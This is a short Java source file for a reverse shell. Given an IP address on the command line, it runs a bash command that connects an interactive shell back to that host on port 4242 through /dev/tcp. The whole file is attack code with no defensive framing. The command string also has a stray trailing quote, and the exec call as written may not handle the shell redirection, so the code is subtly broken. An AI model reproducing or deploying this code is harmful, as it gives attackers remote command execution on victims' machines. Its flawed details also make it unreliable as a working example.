import java.util.*;
import java.net.*;
import java.io.*;

public class ReverseShell{
	String rmt = "";
	int port = 4242;

	public ReverseShell(String connectBackIP){
		this.rmt = connectBackIP;
	}

	public void run() throws IOException{
		System.out.println("Connecting back to " + rmt);
		Runtime r = Runtime.getRuntime();
		String cmd = "bash -i >& /dev/tcp/" + this.rmt+"/" + String.valueOf(this.port)+" 0>&1'";
		Process p = r.exec(cmd);
		try{p.waitFor();
		}catch(InterruptedException e){e.printStackTrace();}
		
	}

	public static void main(String args[]){
		if(args.length < 1){
			System.out.println("Usage: java rev [ip]");
		}else{
			ReverseShell r = new ReverseShell(args[0]);
			try{r.run();}
			catch(IOException e){e.printStackTrace();}
			
		}
	}
}